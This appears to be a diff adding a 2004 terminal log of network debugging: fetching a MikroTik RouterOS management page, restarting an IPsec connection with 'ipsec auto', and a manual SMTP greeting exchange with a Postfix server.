+GET / HTTP/1.0
+HTTP/1.0 200 OK
+Connection: close
+Content-Length: 3034
+Content-Type: text/html
+Date: Tue, 30 Nov 2004 19:48:13 GMT
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+MikroTik RouterOS Managing Webpage
+MikroTik RouterOS 2.8.18
+MikroTik WinBox Console
+Download and run the RouterOS GUI client.
+WinBox has optional command line arguments:
+winbox [<address> [<login> [<password>]]]
+RouterOS Terminal Console
+Telnet to the router and use the ASCII Terminal Console.
+MikroTik RouterOS Reference Manual
+Reference Manual is available on the router.
+Additional documentation is available at http://www.mikrotik.com/documentation.html
+MIKROTIK ROUTER SOFTWARE
+END-USER LICENCE AGREEMENT
+Copyright © 1999 - 2004 MikroTik
+(www.mikrotik.com)
+MikroTik is a trademark of SIA MikroTikls.
+Connection closed by foreign host.
+zsh: 3380 exit 1
+telnet 10.1.7.1 8081
+marajade-[~] mcr 1008 %exit
+Script done on Tue Nov 30 14:50:42 2004
+marajade-[~] root 8 #ipsec auto --down marajade--extrude
+marajade-[~] root 9 #ipsec auto --up marajade--extrude
+marajade-[~] mcr 1020 %telnet pike.sandelman.ca. smtp
+Trying 2002:cd96:c8a4::164...
+Trying 205.150.200.183...
+Connected to pike.sandelman.ca.
+Escape character is '^]'.
+220 pike.sandelman.ca ESMTP Postfix (2.1.5)
+EHLO desk.marajade.sandelman.ca.
+402 Error: command not implemented
+HELO desk.marajade.sandelman.ca.
+250 pike.sandelman.ca
+QUIT
+221 Bye
+Connection closed by foreign host.
